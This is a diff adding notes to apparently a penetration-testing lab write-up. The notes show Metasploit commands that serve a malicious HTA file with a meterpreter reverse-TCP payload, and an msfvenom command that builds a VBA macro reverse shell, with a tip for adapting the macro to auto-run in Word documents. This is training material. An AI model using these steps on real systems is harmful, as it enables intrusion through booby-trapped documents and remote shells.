@@ -50,4 +50,33 @@ Ethernet adapter Ethernet 4:
    Subnet Mask . . . . . . . . . . . : 255.255.0.0
    Default Gateway . . . . . . . . . : 10.10.0.1
 ```
+### Malicious HTA via Metasploit 
+```
+msf6 > use exploit/windows/misc/hta_server
+msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
+LHOST => 10.8.232.37
+msf6 exploit(windows/misc/hta_server) > set LPORT 443
+LPORT => 443
+msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37
+SRVHOST => 10.8.232.37
+msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(windows/misc/hta_server) > exploit
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/misc/hta_server) >
+[*] Started reverse TCP handler on 10.8.232.37:443
+[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
+[*] Server started.
+```
 
+## Visual Basic for Application (VBA)
+```
+user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 341 bytes
+Final size of vba file: 2698 bytes
+```
+Import to note that one modification needs to be done to make this work.  The output will be working on an MS excel sheet. Therefore, change the `Workbook_Open()` to `Document_Open()` to make it suitable for MS word documents.  
